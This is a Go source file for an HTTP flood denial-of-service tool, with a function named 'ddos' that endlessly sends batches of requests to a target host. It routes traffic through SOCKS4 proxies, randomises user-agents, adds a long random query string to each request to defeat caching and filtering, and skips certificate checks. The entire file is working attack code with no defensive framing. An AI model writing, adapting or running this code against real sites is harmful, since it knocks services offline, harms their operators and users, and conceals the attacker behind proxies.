package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/gamexg/proxyclient"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// Returns an array of User-agent
func getUserAgents(number int) []string {
	ua := make([]string, number)

	for i := range ua {
		ua[i] = browser.Random()
	}

	return ua
}

// Returns a random element in the []string
func random(seeds []string) string {
	return seeds[rand.Intn(len(seeds))]
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}

	return string(s)
}

func randomParam() string {
	return fmt.Sprintf("?%s=%s", randomString(5), randomString(1000))
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func makeRequests(
	host string,
	port int,
	method string,
	path string,
	n int,
	useragent string,
	proxy string,
) {
	var conn net.Conn
	var header string = fmt.Sprintf(
		"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
		method,
		path+randomParam(),
		host,
		useragent,
	)

	address := fmt.Sprintf("%s:%d", host, port)

	// Dialer
	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)

	if err != nil {
		return
	}

	// Connect
	conn, err = dialer.DialTimeout("tcp", address, 5*time.Second)

	if err != nil {
		return
	}

	if port == 443 {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         host,
			InsecureSkipVerify: true,
		})
	}

	defer conn.Close()
	for i := 0; i < n; i++ {
		conn.Write([]byte(header))
	}
}

func ddos(
	host string,
	port int,
	method string,
	path string,
	useragents []string,
	proxies []string,
) {
	for {
		makeRequests(host, port, method, path, 100, random(useragents), random(proxies))
	}
}
